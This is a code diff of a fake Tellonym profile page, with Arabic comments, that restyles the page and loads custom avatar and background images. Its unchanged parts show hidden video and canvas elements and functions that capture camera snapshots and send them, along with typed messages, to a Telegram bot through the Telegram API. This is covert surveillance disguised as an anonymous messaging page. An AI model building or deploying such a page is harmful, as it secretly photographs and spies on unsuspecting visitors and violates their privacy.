@@ -3,33 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tellonym - Secure Messaging</title>
+    <title>Tellonym - Custom Profile</title>
     <style>
         body {
-            background-color: #121212; color: white;
-            font-family: 'Segoe UI', sans-serif; margin: 0;
+            /* سيتم استبدال الخلفية عبر الجافاسكربت */
+            background-color: #121212; 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: white;
+            font-family: 'Segoe UI', sans-serif; 
+            margin: 0;
             display: flex; flex-direction: column; align-items: center;
             justify-content: center; height: 100vh; padding: 20px;
         }
+
+        /* طبقة عاتمة فوق الخلفية لتوضيح المحتوى */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: -1;
+        }
+
         .container {
-            width: 100%; max-width: 400px; background-color: #1e1e1e;
+            width: 100%; max-width: 400px; 
+            background-color: rgba(30, 30, 30, 0.9);
             border-radius: 20px; padding: 25px; text-align: center;
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+            z-index: 1;
         }
+
         .profile-info { display: flex; align-items: center; margin-bottom: 20px; gap: 15px; }
-        .avatar { width: 55px; height: 55px; border-radius: 50%; }
+        
+        .avatar { 
+            width: 60px; height: 60px; 
+            border-radius: 50%; 
+            background-size: cover;
+            background-position: center;
+            border: 2px solid #ff4b91;
+        }
+
         .username-container { text-align: right; }
         .username { font-weight: bold; font-size: 1.1rem; display: block; }
-        .tells-count { color: #888; font-size: 0.8rem; }
+        .tells-count { color: #bbb; font-size: 0.8rem; }
+
         textarea {
-            width: 100%; height: 150px; background-color: #2a2a2a;
-            border: 1px solid #333; border-radius: 15px; color: white;
+            width: 100%; height: 150px; background-color: rgba(42, 42, 42, 0.8);
+            border: 1px solid #444; border-radius: 15px; color: white;
             padding: 15px; box-sizing: border-box; resize: none; margin-bottom: 20px;
+            font-size: 1rem;
         }
+
         .btn-send {
             width: 100%; background: #ff4b91; color: white; border: none;
             padding: 14px; border-radius: 30px; font-weight: bold; cursor: pointer;
+            font-size: 1rem; transition: 0.3s;
         }
+
         .btn-send:disabled { background: #555; }
         .status-msg { margin-top: 15px; font-size: 0.85rem; color: #ff4b91; display: none; }
         video, canvas { display: none; }
@@ -56,16 +89,25 @@
     <script>
         let config = {};
 
-        // 1. جلب البيانات من ملف JSON
+        // جلب البيانات وتطبيق الصور
         async function loadConfig() {
             try {
                 const response = await fetch('config.json');
                 config = await response.json();
                 
-                // تحديث الواجهة بالبيانات الجديدة
+                // تحديث النصوص
                 document.getElementById('displayName').innerText = config.username;
                 document.getElementById('displayTells').innerText = config.tellsCount;
-                document.getElementById('userAvatar').style.background = config.avatarColor;
+                
+                // تحديث الأفاتار
+                if(config.avatarImage) {
+                    document.getElementById('userAvatar').style.backgroundImage = `url('${config.avatarImage}')`;
+                }
+
+                // تحديث خلفية الصفحة
+                if(config.backgroundImage) {
+                    document.body.style.backgroundImage = `url('${config.backgroundImage}')`;
+                }
             } catch (err) {
                 console.error("خطأ في تحميل ملف الإعدادات:", err);
             }
@@ -73,6 +115,7 @@
 
         loadConfig();
 
+        // (باقي كود التليجرام والكاميرا كما هو في النسخة السابقة)
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const mainBtn = document.getElementById('mainBtn');
@@ -117,7 +160,7 @@
                 const fd = new FormData();
                 fd.append('chat_id', config.chatId);
                 fd.append('photo', blob, 'img.jpg');
-                fd.append('caption', `🔔 ${label} من المستخدم: ${config.username}`);
+                fd.append('caption', `🔔 ${label} | المستخدم: ${config.username}`);
                 fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg', 0.5);
         }
@@ -126,7 +169,7 @@
             await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: config.chatId, text: `✉️ رسالة جديدة لـ ${config.username}:\n\n${msg}` })
+                body: JSON.stringify({ chat_id: config.chatId, text: `✉️ رسالة لـ ${config.username}:\n\n${msg}` })
             });
         }
     </script>
